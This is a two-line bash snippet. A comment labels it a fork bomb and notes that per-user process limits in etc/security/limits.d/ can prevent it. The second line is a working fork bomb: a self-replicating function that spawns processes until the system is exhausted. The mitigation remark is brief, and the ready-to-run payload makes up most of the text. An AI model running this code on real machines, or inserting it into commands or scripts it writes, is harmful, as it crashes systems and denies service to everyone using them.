#Fork bomb bash shell - Can be prevented by limiting number of processes a user can execute etc/security/limits.d/
forkbomb(){ forkbomb | forkbomb & }; forkbomb